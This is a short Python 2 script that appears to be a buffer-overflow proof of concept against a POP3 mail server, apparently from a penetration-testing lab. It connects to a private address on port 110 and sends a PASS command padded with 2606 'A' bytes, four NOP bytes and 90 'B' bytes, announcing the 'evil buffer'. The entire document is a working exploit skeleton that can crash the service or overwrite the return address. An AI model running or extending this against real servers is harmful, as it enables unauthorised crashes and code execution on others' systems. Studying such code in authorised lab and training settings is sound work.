#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
buffer = "\x41" * 2606 + "\x90\x90\x90\x90" + "B" * 90
try:
	print "\nSending evil buffer..." 
	s.connect(('10.11.11.156',110)) 
	data = s.recv(1024)
	s.send('USER username' +'\r\n') 
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!." 
except:
	print "Could not connect to POP3!"
